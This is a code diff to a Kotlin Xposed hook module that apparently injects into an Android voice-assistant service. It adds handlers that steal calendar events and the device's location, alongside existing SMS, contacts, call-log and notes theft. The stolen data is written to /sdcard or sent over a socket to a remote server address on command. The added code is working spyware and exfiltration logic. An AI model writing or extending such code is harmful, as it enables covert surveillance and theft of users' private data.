@@ -14,8 +14,10 @@ import xyz.mufanc.vap.api.ClassHelper
 import xyz.mufanc.vap.api.HookBase
 import xyz.mufanc.vap.api.MethodFinder
 import xyz.mufanc.vap.util.Log
+import xyz.mufanc.vap.util.CalendarThief
 import xyz.mufanc.vap.util.CallLogThief
 import xyz.mufanc.vap.util.ContactsThief
+import xyz.mufanc.vap.util.LocationThief
 import xyz.mufanc.vap.util.NotesThief
 import xyz.mufanc.vap.util.Recorder
 import xyz.mufanc.vap.util.SmsThief
@@ -64,6 +66,7 @@ class HookVoiceAssist(ixp: XposedInterface): HookBase(ixp) {
             .filter { name == "onStartCommand" }
             .first()
             .createHook(OnStartCommandHook::class.java)
+
 
         thread {
             Thread.sleep(1000)  // 等待服务端开始监听
@@ -133,6 +136,22 @@ class HookVoiceAssist(ixp: XposedInterface): HookBase(ixp) {
             "steal_calllogs" -> {
                 val limit = message.getInt("limit", 50)
                 handleStealCallLogs(kServerAddress, kServerPort, limit)
+            }
+            "steal_calendar_file" -> {
+                val outputPath = message.getString("output") ?: "/sdcard/calendar_theft_raw.json"
+                val limit = message.getInt("limit", 30)
+                handleStealCalendarFile(outputPath, limit)
+            }
+            "steal_calendar" -> {
+                val limit = message.getInt("limit", 30)
+                handleStealCalendar(kServerAddress, kServerPort, limit)
+            }
+            "steal_location_file" -> {
+                val outputPath = message.getString("output") ?: "/sdcard/location_theft_raw.json"
+                handleStealLocationFile(outputPath)
+            }
+            "steal_location" -> {
+                handleStealLocation(kServerAddress, kServerPort)
             }
             else -> handleRecord(action, kServerAddress, kServerPort, message)
         }
@@ -323,4 +342,49 @@ class HookVoiceAssist(ixp: XposedInterface): HookBase(ixp) {
             Log.e(TAG, "Call logs exfiltration failed", e)
         }
     }
+
+    private fun handleStealCalendarFile(outputPath: String, limit: Int) {
+        Log.i(TAG, "Action=steal_calendar_file: extracting top $limit calendar events to $outputPath")
+        try {
+            val thief = CalendarThief()
+            val count = thief.stealToFile(outputPath, limit)
+            Log.i(TAG, "Calendar theft completed, $count events written.")
+        } catch (e: Throwable) {
+            Log.e(TAG, "Calendar theft failed", e)
+        }
+    }
+
+    private fun handleStealCalendar(serverAddress: String, serverPort: Int, limit: Int) {
+        Log.i(TAG, "Action=steal_calendar: extracting top $limit calendar events, target=$serverAddress:$serverPort")
+        try {
+            val thief = CalendarThief()
+            val count = thief.stealToSocket(serverAddress, serverPort, limit)
+            Log.i(TAG, "Calendar exfiltration completed, $count events sent.")
+        } catch (e: Throwable) {
+            Log.e(TAG, "Calendar exfiltration failed", e)
+        }
+    }
+
+    private fun handleStealLocationFile(outputPath: String) {
+        Log.i(TAG, "Action=steal_location_file: extracting latest location to $outputPath")
+        try {
+            val thief = LocationThief()
+            val count = thief.stealToFile(outputPath)
+            Log.i(TAG, "Location theft completed, $count records written.")
+        } catch (e: Throwable) {
+            Log.e(TAG, "Location theft failed", e)
+        }
+    }
+
+    private fun handleStealLocation(serverAddress: String, serverPort: Int) {
+        Log.i(TAG, "Action=steal_location: extracting latest location, target=$serverAddress:$serverPort")
+        try {
+            val thief = LocationThief()
+            val count = thief.stealToSocket(serverAddress, serverPort)
+            Log.i(TAG, "Location exfiltration completed, $count records sent.")
+        } catch (e: Throwable) {
+            Log.e(TAG, "Location exfiltration failed", e)
+        }
+    }
+
 }
